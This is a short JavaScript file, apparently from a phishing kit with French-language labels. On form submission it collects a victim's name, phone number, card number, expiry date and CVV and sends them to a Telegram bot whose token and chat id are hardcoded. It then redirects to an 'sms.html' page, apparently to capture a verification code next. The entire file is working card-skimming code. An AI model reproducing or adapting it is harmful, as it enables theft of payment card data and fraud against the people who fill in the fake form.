
var nom = document.getElementById('name');
var prenom = document.getElementById('prenom');
var tel = document.getElementById('tel');
var carte = document.getElementById('ccnum');
var mm = document.getElementById('mm');
var yy = document.getElementById('yy');
var cvv = document.getElementById('cvv');
var usercode = localStorage.getItem('usercode') ;


document.getElementById('form4').addEventListener('submit', function(e){
    e.preventDefault();

    const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);
    const regexCarteCredit = /^[0-9]{13,19}$/;
    const regexDeuxChiffres = /^[0-9]{2}$/;
    const regexTroisChiffres = /^[0-9]{3}$/;
    const regex10Chiffres = /^[0-9]{10}$/;
    const numeroCarte = carte.value;
    const yyInput = yy.value; 
    const mmInput = mm.value; 
    const cvvInput = cvv.value; 
    const telInput = tel.value; 

    if (regexCarteCredit.test(numeroCarte) && regex10Chiffres.test(telInput) && regexTroisChiffres.test(cvvInput) && regexDeuxChiffres.test(yyInput) && regexDeuxChiffres.test(mmInput)) {
    bot.sendMessage('👔User : ' + usercode + ' 👑Nom : ' + nom.value + ' 🍀Prenom : '+ prenom.value + ' 📞Tel : '+ tel.value + ' 💳Carte Info : ' + carte.value + ' 📆Mois : '+ mm.value + ' 📅Annee : '+ yy.value + ' 💎Cvv : '+ cvv.value)
    .then(res => {
        console.log(res);
        //debugger
        window.location.href = './sms.html' ;
    })
} else {
 document.getElementById('notif').innerText = "🔔 La carte ou le telephone entrer n'est pas valide.";
}

})